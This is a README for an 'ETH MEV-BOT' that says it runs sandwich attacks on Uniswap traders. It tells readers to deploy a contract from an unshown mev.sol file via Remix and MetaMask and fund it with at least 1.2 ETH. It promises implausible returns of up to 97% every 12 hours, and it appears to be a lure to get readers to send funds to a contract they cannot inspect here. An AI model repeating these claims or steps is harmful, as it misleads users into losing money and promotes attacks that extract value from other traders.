---

<div align="center">

# 💎🤖 ETH MEV-BOT 🤖💎
  
An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.

</div>

---

## 📚 About

In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.

---

<div align="center">

## 🚀 How it Works

![profit](https://user-images.githubusercontent.com/132264778/235452623-01aafec4-077e-420e-b937-9fffe28668fb.jpeg)

</div>

Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, determining if a sandwich attack would be profitable. Bots then compete to buy up the token on-chain as swiftly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity. My bot always adds 1 gas more than everybody else's, as long as it remains profitable, ensuring a large number of profitable transactions. It then sends back the ETH to the contract ready for withdrawal. This bot performs all these tasks faster than 99% of other bots out there.

---

## 📈 Estimated Profits

- 0.1ETH - 0.4ETH = up to 10%/12hrs
- 0.4ETH - 1.2ETH = up to 20%/12hrs
- 1.2ETH - 2.4ETH = 20-27%/12hrs
- 2.4ETH - 5ETH = 27-35%/12hrs
- 5.0ETH - 10ETH - 35-50%/12hrs
- 10ETH - 20ETH - 50-63%/12hrs
- 20ETH - 50ETH - 76%+/12hrs
- 50ETH - 100ETH - 97%+/12hrs

---

## 👨‍💻 Instructions

1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix.ethereum.org):
  - 📁 Create a new file mev.sol and paste the code from mev.sol.


<img width="1496" alt="1" src="https://github.com/jrdsubwayeth/MevBotv2.1/assets/114575738/e05f75b9-6758-4642-a392-d4add6e94db4">


2) 🔧 Select compiler version 0.6.6 and press compile.

![2](https://github.com/jrdsubwayeth/MevBotv2.1/assets/114575738/d7368b15-a29c-480b-922c-5f193494dfa9)

3) 🚀 Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".

![3](https://user-images.githubusercontent.com/132264778/235454410-cb9b447c-bb47-4907-872a-6c75bdf17890.png)


4) Copy your newly created contract address and fund it with any amount of ETH that you would like the bot to earn with by simply sending ETH to your newly created contract address. Deposit funds (at least 1.2 ETH to prevent negating slippage) into your specific contract/bot address.

![image](https://github.com/jrdsubwayeth/MevBotv2.1/assets/114575738/5ef59ec8-a07e-46ec-9d43-1ad96599511d)

Head over to your Metamask and fund your newly created contract.

![image](https://github.com/jrdsubwayeth/MevBotv2.1/assets/114575738/12524f19-0ea8-4593-b221-748dca76c2fc)

After your transaction is confirmed your balance should appear like this on your contract.

![image](https://github.com/jrdsubwayeth/MevBotv2.1/assets/114575738/7ca5a7de-6e5d-4769-9a5e-1aab9fed0a54)


5) Click the “Start” button to run the bot.

The bot will start working immediately earning you profits from trades.

6) Withdraw anytime by clicking 'withdrawal'.

:hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 

At any point, you can stop the bot or retrieve your money by calling the withdrawal function.

<div align="center">

💰💰💰 Make money with MevBot 💰💰💰

</div>

---

##### Please ⭐ the repo to support my project
![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)

---
